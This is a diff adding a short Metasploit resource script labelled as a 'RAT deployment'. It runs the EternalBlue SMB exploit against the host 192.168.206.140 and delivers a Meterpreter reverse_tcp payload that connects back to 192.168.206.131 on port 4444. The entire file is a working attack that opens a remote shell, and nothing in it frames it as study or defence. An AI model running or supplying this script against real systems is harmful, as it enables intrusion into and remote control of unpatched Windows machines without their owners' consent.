@@ -1,0 +1,7 @@
+# Resource script for Metasploit RAT deployment
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.206.140
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.206.131
+set LPORT 4444
+run
